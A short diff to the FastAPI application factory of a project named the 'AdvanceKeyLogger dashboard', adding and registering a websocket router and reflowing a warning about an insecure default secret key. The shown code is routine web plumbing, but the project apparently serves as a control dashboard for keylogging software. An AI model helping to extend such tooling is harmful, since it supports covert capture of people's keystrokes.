@@ -1,4 +1,5 @@
 """FastAPI application factory for the AdvanceKeyLogger dashboard."""
+
 from __future__ import annotations
 
 import logging
@@ -13,6 +14,7 @@ from starlette.middleware.sessions import SessionMiddleware
 from dashboard.auth import auth_router
 from dashboard.routes.api import api_router
 from dashboard.routes.pages import pages_router
+from dashboard.routes.websocket import ws_router
 
 logger = logging.getLogger(__name__)
 
@@ -33,8 +35,7 @@ def create_app(secret_key: str = _INSECURE_DEFAULT) -> FastAPI:
         )
     if secret_key == _INSECURE_DEFAULT:
         logger.warning(
-            "Using insecure default secret_key — "
-            "do NOT use in production (APP_ENV=%s)",
+            "Using insecure default secret_key — do NOT use in production (APP_ENV=%s)",
             env,
         )
 
@@ -59,5 +60,6 @@ def create_app(secret_key: str = _INSECURE_DEFAULT) -> FastAPI:
     app.include_router(auth_router)
     app.include_router(pages_router)
     app.include_router(api_router, prefix="/api")
+    app.include_router(ws_router)
 
     return app
